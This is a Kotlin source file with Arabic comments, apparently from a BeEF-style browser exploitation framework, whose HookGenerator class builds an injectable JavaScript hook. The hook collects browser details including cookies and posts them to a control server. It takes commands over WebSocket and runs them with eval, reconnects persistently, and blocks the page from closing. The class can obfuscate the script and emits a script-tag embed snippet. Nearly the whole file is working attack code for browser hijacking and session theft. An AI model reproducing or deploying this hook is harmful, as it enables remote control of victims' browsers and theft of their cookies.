/**
 * Hook Generator - مولد سكربت الحقن
 * ===================================
 * 
 * يولد سكربت JavaScript ديناميكي للحقن في المتصفحات
 * مع دعم التشويش (Obfuscation)
 */

package com.beef.engine.core

import java.util.*

class HookGenerator(
    private val port: Int = 3000,
    var obfuscate: Boolean = true,
    var heartbeatInterval: Int = 5000,
    var sessionTTL: Int = 3600
) {
    
    /**
     * توليد سكربت الـ Hook
     */
    fun generate(sid: String? = null): String {
        val sessionId = sid ?: generateSid()
        val serverUrl = "'+location.protocol+'//'+location.hostname+':$port"
        
        val script = """
(function(){
    var CONFIG = {
        sid: '$sessionId',
        server: $serverUrl',
        heartbeat: $heartbeatInterval,
        ttl: $sessionTTL
    };
    
    var BeEF = {
        // جمع معلومات المتصفح
        fingerprint: function() {
            return {
                ua: navigator.userAgent,
                url: location.href,
                cookies: document.cookie,
                screen: screen.width + 'x' + screen.height,
                platform: navigator.platform,
                language: navigator.language,
                plugins: Array.from(navigator.plugins || []).map(function(p){return p.name}).join(','),
                ts: Date.now()
            };
        },
        
        // إرسال البيانات للخادم
        beacon: function() {
            var self = this;
            var data = this.fingerprint();
            
            fetch(CONFIG.server + '/hook?sid=' + CONFIG.sid, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-BeEF-SID': CONFIG.sid
                },
                body: JSON.stringify(data)
            })
            .then(function(r) { return r.json(); })
            .then(function(response) {
                if (response.commands && response.commands.length > 0) {
                    response.commands.forEach(function(cmd) {
                        self.execute(cmd);
                    });
                }
            })
            .catch(function(e) { console.log('BeEF beacon error'); });
        },
        
        // اتصال WebSocket
        connectWS: function() {
            var self = this;
            var wsUrl = CONFIG.server.replace('http', 'ws') + '/ws?sid=' + CONFIG.sid;
            
            try {
                this.ws = new WebSocket(wsUrl);
                
                this.ws.onopen = function() {
                    self.ws.send(JSON.stringify({type: 'connect', data: self.fingerprint()}));
                };
                
                this.ws.onmessage = function(e) {
                    try {
                        var msg = JSON.parse(e.data);
                        if (msg.type === 'command' && msg.code) {
                            self.execute(msg.code, msg.id);
                        }
                    } catch(err) {}
                };
                
                this.ws.onclose = function() {
                    setTimeout(function() { self.connectWS(); }, 5000);
                };
            } catch(e) {
                setTimeout(function() { self.connectWS(); }, 5000);
            }
        },
        
        // تنفيذ الأوامر
        execute: function(code, commandId) {
            var self = this;
            try {
                var result = eval(code);
                if (commandId && this.ws && this.ws.readyState === 1) {
                    this.ws.send(JSON.stringify({
                        type: 'result',
                        commandId: commandId,
                        result: String(result)
                    }));
                }
            } catch(e) {
                if (commandId && this.ws && this.ws.readyState === 1) {
                    this.ws.send(JSON.stringify({
                        type: 'result',
                        commandId: commandId,
                        result: 'Error: ' + e.message
                    }));
                }
            }
        },
        
        // الثبات - منع إغلاق الصفحة
        persist: function() {
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '';
            });
        },
        
        // بدء العمل
        init: function() {
            var self = this;
            this.beacon();
            setInterval(function() { self.beacon(); }, CONFIG.heartbeat);
            this.connectWS();
            this.persist();
        }
    };
    
    // تأخير البدء قليلاً للتأكد من تحميل الصفحة
    if (document.readyState === 'complete') {
        BeEF.init();
    } else {
        window.addEventListener('load', function() { BeEF.init(); });
    }
})();
        """.trimIndent()
        
        return if (obfuscate) obfuscateCode(script) else script
    }
    
    /**
     * تشويش بسيط للكود
     */
    private fun obfuscateCode(code: String): String {
        // تشويش بسيط - استبدال المتغيرات
        val replacements = mapOf(
            "CONFIG" to "_${randomString(4)}",
            "BeEF" to "_${randomString(4)}",
            "fingerprint" to "_${randomString(3)}",
            "beacon" to "_${randomString(3)}",
            "connectWS" to "_${randomString(3)}",
            "execute" to "_${randomString(3)}",
            "persist" to "_${randomString(3)}",
            "init" to "_${randomString(2)}"
        )
        
        var result = code
        replacements.forEach { (original, replacement) ->
            result = result.replace(original, replacement)
        }
        
        // إزالة المسافات والأسطر الفارغة
        result = result
            .lines()
            .filter { it.isNotBlank() }
            .joinToString("\n") { it.trim() }
        
        // تحويل لسطر واحد مضغوط
        result = result
            .replace(Regex("\\s*\\n\\s*"), "")
            .replace(Regex("\\s+"), " ")
        
        return "/* BeEF Engine */\n$result"
    }
    
    /**
     * توليد معرف جلسة عشوائي
     */
    private fun generateSid(): String {
        return UUID.randomUUID().toString().replace("-", "").take(16)
    }
    
    /**
     * توليد سلسلة عشوائية
     */
    private fun randomString(length: Int): String {
        val chars = "abcdefghijklmnopqrstuvwxyz"
        return (1..length).map { chars.random() }.joinToString("")
    }
    
    /**
     * الحصول على رابط الـ Hook
     */
    fun getHookUrl(host: String = "127.0.0.1"): String {
        return "http://$host:$port/hook.js"
    }
    
    /**
     * الحصول على كود التضمين
     */
    fun getEmbedCode(host: String = "127.0.0.1"): String {
        return """<script src="${getHookUrl(host)}"></script>"""
    }
}
